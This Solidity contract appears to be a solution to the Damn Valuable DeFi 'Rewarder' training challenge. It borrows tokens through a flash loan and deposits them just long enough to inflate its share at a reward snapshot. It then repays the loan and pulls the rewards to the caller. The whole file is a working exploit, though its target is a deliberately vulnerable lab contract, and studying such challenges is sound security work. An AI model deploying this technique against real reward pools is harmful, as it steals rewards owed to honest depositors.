// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function distributeRewards() external returns (uint256);
}

interface IFlashLoanerPool {
     function flashLoan(uint256 amount) external;
}

contract RewarderAttack {
    IPool immutable public pool;
    IFlashLoanerPool immutable public flashLoanerPool;
    DamnValuableToken immutable public liquidityToken;
    RewardToken immutable public rewardToken;

    constructor(
        IPool _pool, 
        IFlashLoanerPool _flashLoanerPool, 
        DamnValuableToken _liquidityToken, 
        RewardToken _rewardToken
     ) {
        pool = _pool;
        flashLoanerPool = _flashLoanerPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool), amount);

        // Deposit temporarily into pool to trigger a snapshot.
        pool.deposit(amount);

        // Pull all tokens back.
        pool.withdraw(amount);

        // Simply pay back flash loan now that snapshot is done.
        liquidityToken.transfer(msg.sender, amount);
    }

    function drainFunds(uint256 amountToFlashLoan) external {
        // Borrow before snapshot is taken to artificially increase share of reward pool using flash loaned funds.
        // This attack only works if the `amountToFlashLoan` >>> token balance of the pool from other depositors.
        flashLoanerPool.flashLoan(amountToFlashLoan);

        pool.distributeRewards();

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    } 
}
